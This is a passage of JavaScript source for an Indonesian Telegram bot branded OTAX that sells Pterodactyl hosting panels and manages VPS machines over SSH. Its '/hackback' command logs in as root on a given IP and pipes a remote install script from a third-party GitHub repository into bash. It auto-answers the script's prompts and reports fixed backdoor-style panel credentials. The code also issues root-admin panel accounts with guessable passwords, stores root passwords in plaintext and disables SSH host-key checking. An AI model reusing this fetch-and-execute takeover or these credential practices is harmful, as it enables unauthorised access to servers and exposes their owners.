𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}
 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
bot.onText(/\/11gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  
  const u = t[1];
  const name = username + "10gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "11000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
√ Login : ${domain}
√ Username : ${user.username}
√ Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unli namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "unli";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unli.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel KingOtax");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// createadmin
bot.onText(/\/createadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const commandParams = match[1].split(",");
  const panelName = commandParams[0].trim();
  const telegramId = commandParams[1].trim();
  if (commandParams.length < 2) {
    bot.sendMessage(
      chatId,
      "Format Salah! Penggunaan: /createadmin namapanel,idtele"
    );
    return;
  }
  const password = panelName + "117";
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.OTAX`,
        username: panelName,
        first_name: panelName,
        last_name: "Memb",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
TYPE: user
➟ ID: ${user.id}
➟ USERNAME: ${user.username}
➟ EMAIL: ${user.email}
➟ NAME: ${user.first_name} ${user.last_name}
➟ LANGUAGE: ${user.language}
➟ ADMIN: ${user.root_admin}
➟ CREATED AT: ${user.created_at}
    `;
    bot.sendMessage(chatId, userInfo);
    bot.sendMessage(
      telegramId,
      `
┏━⬣❏「 INFO DATA ADMIN PANEL 」❏
│➥  Login : ${domain}
│➥  Username : ${user.username}
│➥  Password : ${password} 
┗━━━━━━━━━⬣
│ Rules : 
│• Jangan Curi Sc
│• Jangan Buka Panel Orang
│• Jangan Ddos Server
│• Kalo jualan sensor domainnya
│• Jangan Bagi² Panel Free!😡
┗━━━━━━━━━━━━━━━━━━⬣
ᴏᴛᴀx ʜᴇʀᴇ!
    `
    );
  } catch (error) {
    console.error(error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti."
    );
  }
});
  

bot.onText(/\/listsrv/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) return bot.sendMessage(chatId, "⛔️ Only owner can use this.");

  try {
    let f = await fetch(`${domain}/api/application/servers?page=1`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });
    let res = await f.json();
    let servers = res.data || [];
    if (!servers.length) return bot.sendMessage(chatId, "⚠️ Tidak ada server ditemukan di panel!");

    let msgText = "<b>📋 List Server:</b>\n\n";
    let no = 1;
    for (let server of servers) {
      let s = server.attributes;
      let status = "⏺ Unknown";
      try {
        let f3 = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${pltc}`,
          },
        });
        let data = await f3.json();
        let a = data.attributes || {};
        status = a.current_state === "running" ? "🟢 Online" : (a.current_state === "offline" ? "🔴 Offline" : "⏺ Unknown");
      } catch (e) {}
      msgText += `#${no++}. <b>${s.name}</b> — ${status}\n`;
    }
    bot.sendMessage(chatId, msgText, { parse_mode: "HTML" });

  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal mengambil data server.");
  }
});
bot.onText(/\/qris/, (msg) => {
    const chatId = msg.chat.id;
    const qris = settings.qris;

    bot.sendPhoto(chatId, qris, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
  parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
});
bot.onText(/^\/vps$/, (msg) => {
  bot.sendMessage(msg.chat.id, `❗ *Format Salah!*\nGunakan: /vps ip,passwordlama,passwordbaru`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/^\/vps (.+)/, (msg, match) => {
    const chatId=msg.chat.id
  const userId=msg.from.id
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }

  const args = match[1].split(",");
  if (args.length < 3) {
    return bot.sendMessage(chatId, `❗ *Format Salah!*\nGunakan: /vps ip,passwordlama,passwordbaru`, {
      parse_mode: "Markdown"
    });
  }

  const [ip, oldPass, newPass] = args.map(a => a.trim());
  const conn = new Client();

  const command = `
echo "root:${newPass}" | chpasswd
echo "[✓] Password berhasil diganti!"
`;

  bot.sendMessage(chatId, `🔐 Menghubungkan ke VPS ${ip}...`);

  conn
    .on("ready", () => {
      bot.sendMessage(chatId, `✅ Terhubung ke VPS!\nMengganti password root...`);

      conn.exec(command, (err, stream) => {
        if (err) {
          bot.sendMessage(chatId, `❌ Gagal menjalankan perintah: ${err.message}`);
          return conn.end();
        }

        let output = "";
        let error = "";

        stream
          .on("close", () => {
            conn.end();
            if (error.includes("Permission denied") || error.length > 2) {
              bot.sendMessage(chatId, `❌ Gagal mengganti password:\n\`\`\`${error.trim()}\`\`\``, {
                parse_mode: "Markdown"
              });
            } else {
              bot.sendMessage(chatId, `✅ *Password root berhasil diganti!*\nIP: ${ip}\nPassword Baru: \`${newPass}\``, {
                parse_mode: "Markdown"
              });
            }
          })
          .on("data", (data) => {
            output += data.toString();
          })
          .stderr.on("data", (data) => {
            error += data.toString();
          });
      });
    })
    .on("error", (err) => {
      bot.sendMessage(chatId, `❌ *Gagal konek ke VPS:*\n\`${err.message}\``, {
        parse_mode: "Markdown"
      });
    })
    .connect({
      host: ip,
      port: 22,
      username: "root",
      password: oldPass,
      readyTimeout: 20000,
    });
});
bot.onText(/^(\.|\#|\/)hackback$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /hackback 𝗶𝗽𝘃𝗽𝘀,𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱`);
  });
bot.onText(/\/hackback (.+)/, async (msg, match) => {
  const chatId=msg.chat.id
  const userId=msg.from.id
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }

   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  
  const t = text.split(',');

  if (t.length < 2) {
    return bot.sendMessage(chatId, '𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /hackback 𝗶𝗽𝘃𝗽𝘀,𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱,𝘁𝗼𝗸𝗲𝗻');
  }
  const ipvps = t[0];
  const passwd = t[1];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        bot.sendMessage(chatId,'PROSES HACK BACK PTERODACTYL')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         bot.sendMessage(chatId, '𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n\n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: lexcz\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: lexcz\n\n\n');
                conn.end();
            }).on('data', (data) => {
                stream.write('7\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
});
const VPS_DB = './vps_hosts.json';
if (!fs.existsSync(VPS_DB)) fs.writeFileSync(VPS_DB, JSON.stringify({}), 'utf8');

function loadHosts() { return JSON.parse(fs.readFileSync(VPS_DB, 'utf8')); }
function saveHosts(db) { fs.writeFileSync(VPS_DB, JSON.stringify(db, null, 2)); }
function clampHours(s) { const m = String(s||'').match(/^\d{1,3}$/); const h = m?+m[0]:24; return Math.max(1, Math.min(h, 168)); }

const HEALTH_SCRIPT = `
set -euo pipefail
NOW="$(date +'%Y-%m-%d %H:%M:%S %Z')"
HOST="$(hostname -f 2>/dev/null || hostname)"
HOURS="\${1:-24}"
OUT="/tmp/otax-health-\$\$.txt"; rm -f "$OUT"
p(){ echo -e "$1" >>"$OUT"; } h(){ p "\\n===== $1 ====="; }
p "OTAX VPS INCIDENT REPORT (last $HOURS h)"; p "Host: $HOST"; p "Time: $NOW"
h "Uptime & Load"; (uptime -p || true) >>"$OUT"; echo -n "Load: " >>"$OUT"; cut -d' ' -f1-3 /proc/loadavg >>"$OUT"
h "Reboots/Shutdowns"; last -x -n 20 || true
h "Failed Services"; systemctl --failed || true
h "Journal (prio 0..3)"; journalctl -p 3 --since="$HOURS hours ago" -o short-iso || true
h "Kernel/OOM/Disk"; journalctl -k --since="$HOURS hours ago" -o short-iso | egrep -i 'oom|killed process|panic|segfault|i/o error|ext4|xfs|btrfs|nvme|sda' || true
h "dmesg tail"; dmesg --ctime 2>/dev/null | egrep -i 'oom|killed process|panic|segfault|i/o error' | tail -n 120 || true
h "Disk Usage"; df -hT -x tmpfs -x devtmpfs
h "Listening Ports"; ss -ltnp 2>/dev/null | head -n 15 || true
h "nginx error.log"; tail -n 100 /var/log/nginx/error.log 2>/dev/null || echo "(no nginx error.log)"
h "pterodactyl laravel.log"; tail -n 150 /var/www/pterodactyl/storage/logs/laravel.log 2>/dev/null || echo "(no laravel.log)"
h "Docker"; docker ps --format "table {{.Names}}\\t{{.Status}}\\t{{.Ports}}" 2>/dev/null || echo "(docker not installed)"
cat "$OUT"; rm -f "$OUT"
`;

function runSSH(ip, pass, cmd, timeoutMs=120000) {
  return new Promise((resolve) => {
    const args = [
      '-p', '22',
      '-o', 'StrictHostKeyChecking=no',
      `root@${ip}`,
      cmd
    ];
    execFile('sshpass', ['-p', pass, 'ssh', ...args], { timeout: timeoutMs, maxBuffer: 4*1024*1024 }, (err, stdout, stderr) => {
      resolve({ code: err ? (err.code ?? 1) : 0, out: (stdout||'') + (stderr||'') });
    });
  });
}

async function sendTextOrFile(bot, chatId, caption, text) {
  if ((text||'').length <= 3800) {
    return bot.sendMessage(chatId, "```\n" + text.trim() + "\n```", { parse_mode: 'Markdown' });
  }
  const path = `/tmp/vps-${Date.now()}.txt`;
  fs.writeFileSync(path, text);
  await bot.sendDocument(chatId, path, { caption });
  fs.unlink(path, ()=>{});
}

bot.onText(/^[\/.!]vpsadd\s+(\S+)\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const alias = m[1];
  const [ip, pass] = m[2].split(':'); // Format: IP:Password
  if (!ip || !pass) return bot.sendMessage(chatId, '❌ Format salah.\nGunakan: `/vpsadd <alias> <ip:password>`', { parse_mode: 'Markdown' });

  const db = loadHosts();
  db[alias] = { ip, pass };
  saveHosts(db);
  bot.sendMessage(chatId, `✅ VPS tersimpan:\nAlias: ${alias}\nIP: ${ip}\nUser: root`);
});

bot.onText(/^[\/.!]vpslist$/i, async (msg) => {
  const chatId = msg.chat.id;
  const db = loadHosts();
  const lines = Object.entries(db).map(([k,v]) => `• ${k}: root@${v.ip}`);
  bot.sendMessage(chatId, lines.length? lines.join('\n') : 'Kosong');
});

bot.onText(/^[\/.!]vpsdel\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const db = loadHosts();
  if (db[m[1]]) { delete db[m[1]]; saveHosts(db); bot.sendMessage(chatId, '✅ Dihapus'); }
  else bot.sendMessage(chatId, '❌ Alias tidak ditemukan');
});

bot.onText(/^[\/.!]vpscheck\s+(\S+)(?:\s+(\d{1,3}))?$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const alias = m[1];
  const hours = clampHours(m[2]);
  const db = loadHosts();
  const host = db[alias];
  if (!host) return bot.sendMessage(chatId, '❌ Alias tidak ditemukan');

  const wait = await bot.sendMessage(chatId, `⏳ Menghubungi ${alias} (root@${host.ip})...`);
  const remoteScript = `bash -lc 'cat > /tmp/otax-h.sh <<\"EOF\"\n${HEALTH_SCRIPT}\nEOF\nbash /tmp/otax-h.sh ${hours}; rm -f /tmp/otax-h.sh'`;
  const res = await runSSH(host.ip, host.pass, remoteScript);
  await bot.editMessageText(`✅ Laporan ${alias} (${hours}h). Mengirim...`, { chat_id: chatId, message_id: wait.message_id });
  await sendTextOrFile(bot, chatId, `VPS ${alias} report (${hours}h)`, res.out || '(no output)');
});


setInterval(async () => {
  const db = loadHosts();
  const adminChatId = 'GANTI_DENGAN_CHAT_ID_ADMIN'; // isi chat id admin
  for (const [alias, host] of Object.entries(db)) {
    const res = await runSSH(host.ip, host.pass, `journalctl -p 3 --since="1 hour ago" -o short-iso`);
    if (res.out && res.out.trim()) {
      await sendTextOrFile(bot, adminChatId, `⚠️ Error di VPS ${alias} (1h terakhir)`, res.out);
    }
  }
}, 3600 * 1000);
})();

